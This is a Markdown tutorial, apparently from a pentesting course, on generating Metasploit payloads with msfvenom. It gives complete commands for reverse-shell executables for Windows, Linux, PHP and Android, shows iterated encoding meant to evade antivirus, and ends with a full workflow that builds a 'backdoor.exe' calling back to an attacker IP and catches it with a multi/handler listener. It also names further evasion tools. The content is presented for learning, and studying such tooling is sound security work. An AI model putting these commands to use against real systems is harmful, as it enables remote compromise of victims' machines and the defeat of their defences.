# 04: Payload Creation with Msfvenom 💀

`msfvenom` is the combination of two legacy Metasploit tools: `msfpayload` and `msfencode`. It is a command-line tool used to generate and encode malicious payloads (shells) that can be embedded into files, scripts, or executables.



---

## 📌 Table of Contents
1. [Understanding the Syntax](#-understanding-the-syntax)
2. [Common Payload Formats](#-common-payload-formats)
3. [Evasion with Encoders](#-evasion-with-encoders)
4. [The Exploitation Workflow (Generating & Catching)](#-the-exploitation-workflow-generating--catching)
5. [Quick Cheat Sheet](#-quick-cheat-sheet)

---

## 💻 Understanding the Syntax
The basic structure is:
> `msfvenom -p [payload] LHOST=[your_ip] LPORT=[your_port] -f [format] > [output_file]`

* **`-p`**: Specifies the payload (e.g., `windows/meterpreter/reverse_tcp`).
* **`LHOST`**: Your Kali/Attacker machine's IP address.
* **`LPORT`**: The port on your machine to listen for the connection.
* **`-f`**: The output format (exe, elf, php, etc.).
* **`-e`**: (Optional) Encoders to help evade Antivirus detection.

---

## 📂 Common Payload Formats
Depending on the target, you will need to change the file format.

| Target OS | Format (`-f`) | Example Command |
| :--- | :--- | :--- |
| **Windows** | `exe` | `msfvenom -p windows/meterpreter/reverse_tcp ... -f exe > shell.exe` |
| **Linux** | `elf` | `msfvenom -p linux/x86/meterpreter/reverse_tcp ... -f elf > shell.elf` |
| **Web (PHP)**| `raw` | `msfvenom -p php/meterpreter/reverse_tcp ... -f raw > shell.php` |
| **Android** | `apk` | `msfvenom -p android/meterpreter/reverse_tcp ... -f apk > app.apk` |

---

## 🛡️ Evasion with Encoders
Security software (AV/EDR) looks for "signatures" of known malicious code. Encoders scramble the payload's appearance without changing its function.

* **List Encoders:** `msfvenom -l encoders`
* **Using an Encoder:**
  ```bash
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > payload.exe
  ```

- `-e`: Specifies the encoder (`shikata_ga_nai` is the most famous).
    
- `-i`: Iterations (how many times to encode; higher numbers make it harder for AV to detect).
    

## 🚀 The Exploitation Workflow (Generating & Catching)

Generating the file is only half the battle. You must be ready to "catch" the connection when the target runs the file.

### Step 1: Generate the Payload

Bash

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe > backdoor.exe
```

### Step 2: Set up the Listener (in `msfconsole`)

You must use the `multi/handler` module to listen for the incoming connection:

Bash

```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.0.0.5
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > run
```

Once you run this, Metasploit sits and waits. As soon as the victim runs `backdoor.exe`, you will see a `meterpreter >` session appear in your terminal.

## 📋 Quick Cheat Sheet

| **Task**                 | **Command**                                                                            |
| ------------------------ | -------------------------------------------------------------------------------------- |
| **List Payloads**        | `msfvenom -l payloads`                                                                 |
| **Generate Windows EXE** | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=... LPORT=... -f exe > shell.exe`   |
| **Generate Linux ELF**   | `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=... LPORT=... -f elf > shell.elf` |
| **Generate PHP Shell**   | `msfvenom -p php/meterpreter/reverse_tcp LHOST=... LPORT=... -f raw > shell.php`       |


---

> **⚠️ Important Security Note:**
> 
> Modern Antivirus and EDR systems are very good at detecting `msfvenom` generated files. In real-world pentesting, we often use more advanced tools like `TheFatRat` or `veil-framework` for better evasion. `msfvenom` is great for practice, but keep this limitation in mind!